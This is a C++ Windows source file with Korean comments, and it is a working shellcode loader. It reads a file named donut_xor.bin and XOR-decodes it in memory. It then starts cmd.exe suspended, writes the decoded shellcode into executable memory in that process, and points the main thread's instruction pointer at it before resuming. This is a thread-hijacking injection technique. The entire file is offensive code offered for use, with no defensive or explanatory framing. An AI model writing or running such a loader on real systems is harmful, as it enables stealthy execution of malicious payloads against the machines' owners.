#include <windows.h>
#include <iostream>
#include <fstream>

int main()
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    // 1. 쉘코드 파일 로드
    std::ifstream file("donut_xor.bin", std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "[!] Cannot open evil.bin" << std::endl;
        return 1;
    }

    std::streamsize shellcodeSize = file.tellg();
    file.seekg(0, std::ios::beg);

    BYTE* shellcode = new BYTE[shellcodeSize];
    if (!file.read(reinterpret_cast<char*>(shellcode), shellcodeSize)) {
        std::cerr << "[!] Failed to read shellcode" << std::endl;
        delete[] shellcode;
        return 1;
    }

    std::cout << "[*] Loaded shellcode (" << shellcodeSize << " bytes)" << std::endl;

    BYTE xorKey = 0xAA;
    for (std::streamsize i = 0; i < shellcodeSize; ++i)
        shellcode[i] ^= xorKey;
    std::cout << "[*] Shellcode decrypted in memory" << std::endl;

    // 2. 더미 프로세스 생성 (예: notepad.exe)
    if (!CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi))
    {
        std::cerr << "[!] Failed to create dummy process" << std::endl;
        delete[] shellcode;
        return 1;
    }

    std::cout << "[*] Suspended dummy process created (PID: " << pi.dwProcessId << ")" << std::endl;

    // 3. 메모리 할당 및 쉘코드 쓰기
    LPVOID remoteAddress = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!remoteAddress) {
        std::cerr << "[!] VirtualAllocEx failed" << std::endl;
        delete[] shellcode;
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remoteAddress, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[!] WriteProcessMemory failed" << std::endl;
        delete[] shellcode;
        return 1;
    }

    std::cout << "[*] Shellcode injected at " << remoteAddress << std::endl;

    // 4. 메인 스레드 컨텍스트 설정
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[!] GetThreadContext failed" << std::endl;
        delete[] shellcode;
        return 1;
    }

    ctx.Rip = (DWORD64)remoteAddress;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[!] SetThreadContext failed" << std::endl;
        delete[] shellcode;
        return 1;
    }

    std::cout << "[*] EntryPoint set to shellcode address" << std::endl;

    // 5. 실행
    ResumeThread(pi.hThread);
    std::cout << "[*] Shellcode execution started." << std::endl;

    delete[] shellcode;
    return 0;
}
